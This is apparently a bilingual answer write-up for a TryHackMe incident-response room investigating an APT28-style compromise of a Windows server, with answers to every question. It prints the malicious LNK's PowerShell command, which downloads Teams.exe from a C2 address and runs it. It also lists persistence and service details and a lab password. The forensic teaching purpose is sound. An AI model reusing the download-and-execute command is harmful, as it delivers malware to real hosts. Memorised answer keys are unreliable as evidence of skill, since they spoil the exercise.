# APT28 in the Snare
| **Dificultad** | Medium |
| **Tipo** | Walkthrough |
| **Slug** | `apt28inthesnare` |
| **Link** | [TryHackMe](https://tryhackme.com/room/apt28inthesnare) |
| **Sección** | SOC / Threat Intelligence |
| **Fuente** | Writeup de thmrevenant (GitHub) |
| **Componentes** | Windows forensics, análisis de LNK, PowerShell BitsTransfer, C2, persistence (Run keys), servicios maliciosos, lsass, robo de credenciales AWS, TI (APT28) |
| **Impacto** | Análisis de incidente de seguridad que implica investigar un servidor comprometido por el grupo APT28, incluyendo análisis de malware, persistencia y robo de credenciales. |
---
**Contexto:** Análisis de incidente de seguridad que implica investigar un servidor comprometido por el grupo APT28, incluyendo análisis de malware, persistencia y robo de credenciales.
*EN: Security incident analysis involving investigation of a server compromised by the APT28 group, including malware analysis, persistence, and credential theft.*
## Solucionario
### Task 1 — Host Information and Initial Compromise
**Explicación:** Tras conectarse al host, se investiga el compromiso inicial: info del host (nombre **Dev-QA-Server**, puertos `135,445,3389,5985`, usuarios `Bob Martin, DFIR Analyst, Tom Barry`, NTFS, zona horaria UTC). Se identifica que **Tom Barry** descargó `Service_Configuration_Guide.rar` desde `https://file.io/VCvdoR2TuyA3`, que contenía `Service_Configuration.txt.lnk` (hash SHA256 `e8b644b8ab35424adee7788003e8feca33a95a46238463978d74587d5ea147d1`).
*EN: After connecting to the host, the initial compromise is investigated: host info (name **Dev-QA-Server**, ports `135,445,3389,5985`, users `Bob Martin, DFIR Analyst, Tom Barry`, NTFS, UTC timezone). **Tom Barry** downloaded `Service_Configuration_Guide.rar` from `https://file.io/VCvdoR2TuyA3`, containing `Service_Configuration.txt.lnk` (SHA256 `e8b644b8ab35424adee7788003e8feca33a95a46238463978d74587d5ea147d1`).*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the name of the compromised host? | `Dev-QA-Server` |
| 2 | What TCP ports, excluding dynamic ports, are open on the host? (Ascending order) | `135, 445, 3389, 5985` |
| 3 | What user accounts are configured on this host? (Full names, alphabetical order) | `Bob Martin, DFIR Analyst, Tom Barry` |
| 4 | What type of file system does the compromised host use? | `NTFS` |
| 5 | What is the time zone of the compromised host? | `UTC` |
| 6 | What is the name of the archive that Tom downloaded to the server? | `Service_Configuration_Guide.rar` |
| 7 | What file was contained within the archive? | `Service_Configuration.txt.lnk` |
| 8 | What is the SHA256 hash of this malicious LNK file? | `e8b644b8ab35424adee7788003e8feca33a95a46238463978d74587d5ea147d1` |
| 9 | What is the URL from which this archive was downloaded? | `https://file.io/VCvdoR2TuyA3` |
### Task 2 — Malware Analysis and Execution
**Explicación:** El LNK malicioso ejecuta PowerShell con `Start-BitsTransfer` para descargar `C:\Teams.exe` desde el C2 **54.163.75.95:8085** y ejecutarlo. El servicio usado para descargar el stage 2 fue **BitsTransfer**; el archivo descargado fue `C:\Teams.exe`. **Teams.exe** estableció conexión con el C2 el `2024-12-07 15:23:04` — se sospecha que es una **reverse shell**.
*EN: The malicious LNK runs PowerShell with `Start-BitsTransfer` to download `C:\Teams.exe` from C2 **54.163.75.95:8085** and execute it. The service used was **BitsTransfer**; the downloaded file was `C:\Teams.exe`. **Teams.exe** connected to the C2 at `2024-12-07 15:23:04` — suspected to be a **reverse shell**.*

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-BitsTransfer -Source 'http://54.163.75.95:8085/Teams.exe' -Destination 'C:\Teams.exe'; Start-Process 'C:\Teams.exe'"
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What command was executed by the malicious LNK file? | `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-BitsTransfer -Source 'http://54.163.75.95:8085/Teams.exe' -Destination 'C:\Teams.exe'; Start-Process 'C:\Teams.exe'"` |
| 2 | What is the IP address of the C2 server from which the second-stage malware was downloaded? | `54.163.75.95` |
| 3 | Which service was utilised to download second-stage malware? | `BitsTransfer` |
| 4 | Which malicious file was downloaded using the command in the LNK file? | `C:\Teams.exe` |
| 5 | When did Teams.exe establish a connection to the C2 server? | `2024-12-07 15:23:04` |
| 6 | What do we suspect Teams.exe is? | `reverse shell` |
### Task 3 — Post-Exploitation Activities
**Explicación:** Comandos de discovery en orden de ejecución: `whoami, ipconfig, systeminfo`. La persistencia se establece en `HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\SqdyeRrWHEonQlT`, ejecutando `C:\Users\TOMBAR~1\AppData\Local\Temp\default.exe`. MITRE ID asociado: **T1547** (Boot/Logon Autostart Execution).
*EN: Discovery commands in execution order: `whoami, ipconfig, systeminfo`. Persistence is set at `HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\SqdyeRrWHEonQlT`, executing `C:\Users\TOMBAR~1\AppData\Local\Temp\default.exe`. Associated MITRE ID: **T1547**.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What discovery commands did the threat actor execute on the server after gaining access? Format: In order of time executed. | `whoami, ipconfig, systeminfo` |
| 2 | What registry path did the attacker use to establish persistence? | `HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\SqdyeRrWHEonQlT` |
| 3 | What file will be executed from the persistence mechanism established by the attacker? | `C:\Users\TOMBAR~1\AppData\Local\Temp\default.exe` |
| 4 | What is the MITRE ID associated with this type of persistence? | `T1547` |
### Task 4 — Privilege Escalation and Lateral Movement
**Explicación:** El atacante crea un servicio malicioso `MEjwWODscHvM` que ejecuta `C:\Users\TOMBAR~1\AppData\Local\Temp\ZJBDfQkGXS.exe`, escalando a **SYSTEM**. Ese ejecutable establece conexión con el C2 a través del puerto **1876**. Tras escalar, verifica miembros del grupo admin con `net localgroup Administrators`.
*EN: The attacker creates the malicious service `MEjwWODscHvM` running `C:\Users\TOMBAR~1\AppData\Local\Temp\ZJBDfQkGXS.exe`, escalating to **SYSTEM**. That executable connects to the C2 through port **1876**. After escalating, the admin group members are verified with `net localgroup Administrators`.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the name of the first service that the attacker created to escalate privileges? | `MEjwWODscHvM` |
| 2 | What executable did this malicious service run? | `C:\Users\TOMBAR~1\AppData\Local\Temp\ZJBDfQkGXS.exe` |
| 3 | To which privilege level did the attacker successfully escalate? | `SYSTEM` |
| 4 | Through which port does the executable file from the service establish a connection to the Command and Control server? | `1876` |
| 5 | Which command did the attacker use to check which users are in the admin group after escalating his privileges? | `net localgroup Administrators` |
### Task 5 — Credential Dumping and Data Exfiltration
**Explicación:** El atacante accedió a **lsass.exe** para volcar contraseñas de usuarios. Se cree que robó `AWSCredentials.txt` con la contraseña `Fgnmusid!23`.
*EN: The attacker accessed **lsass.exe** to dump user passwords. They are believed to have stolen `AWSCredentials.txt` containing the password `Fgnmusid!23`.*

```
Descarga de archivo RAR → Ejecución de archivo LNK → PowerShell BitsTransfer → Descarga de Teams.exe → Conexión C2 → Enumeración → Persistencia Registry → Escalada SYSTEM → Volcado Credenciales → Robo AWS
```
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What process did the attacker access to dump user passwords from the system? | `lsass.exe` |
| 2 | What was the name of the file containing AWS credentials that the attacker is believed to have stolen from the server? | `AWSCredentials.txt` |
| 3 | What password is stored in this credential file? | `Fgnmusid!23` |
---
**Metodología:** Info del host y compromiso inicial (RAR + LNK) → análisis del malware (PowerShell/BitsTransfer → Teams.exe) → conexión C2 → post-explotación (discovery, persistencia Run key) → escalada a SYSTEM (servicio malicioso) → volcado de credenciales (lsass) y robo de credenciales AWS.
**Learning chain:** ingeniería social (LNK) → stage 2 vía BitsTransfer → C2 → persistencia → escalada de privilegios → credential dumping/exfiltración.
**MITRE ATT&CK:** T1566.001 (Spearphishing Attachment)/LNK, T1059.001 (PowerShell), T1197 (BITS Jobs), T1105 (Ingress Tool Transfer), T1547.001 (Registry Run Keys), T1543.003 (Windows Service), T1003.001 (LSASS Memory), T1552 (Unsecured Credentials - AWS), T1071.001 (Web Protocols C2).
**Fuente:** [TryHackMe - APT28 in the Snare](https://tryhackme.com/room/apt28inthesnare)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
